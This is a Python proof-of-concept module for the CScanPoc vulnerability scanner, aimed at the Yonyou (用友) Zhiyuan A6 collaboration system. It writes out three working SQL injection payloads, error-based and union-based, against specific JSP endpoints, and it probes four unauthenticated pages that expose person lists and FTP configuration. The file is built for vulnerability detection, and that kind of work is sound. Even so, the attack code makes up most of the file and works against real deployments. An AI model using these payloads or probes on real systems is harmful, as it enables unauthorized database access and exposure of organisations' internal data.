# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0005'  # 平台漏洞编号，留空
    name = '用友致远A6协同系统SQL 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-03'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等。
        用友致远A6协同系统高危SQL注射，报错注入。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f6b831aa-c21d-4ea2-a8de-5f17bd1b05df'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payloads = [
                "/yyoa/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27%20and%20(select%201%20from%20(select%20count(*),concat(md5(1234),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23",
                "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'%20union%20all%20select%20NULL,md5(1234),NULL,NULL%23",
                "/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20md5(1234)%20--",
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url)
                if (code == 500 or code == 200) and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                    #security_hole(url + '   found sql injection!')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

            payloads2 = [
                '/yyoa/common/SelectPerson/reloadData.jsp',
                '/yyoa/assess/js/initDataAssess.jsp',
                '/yyoa/ext/trafaxserver/SystemManage/config.jsp',
                '/yyoa/common/selectPersonNew/initData.jsp?trueName=1'
            ]
            for payload2 in payloads2:
                url = self.target + payload2
                code, head, res, errcode, _ = hh.http(url)
                if code == 200 and (('insertObject' in res) or ('personList' in res) or ('FTP' in res)):
                    #security_hole(url + "   Unauthorized access! ")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
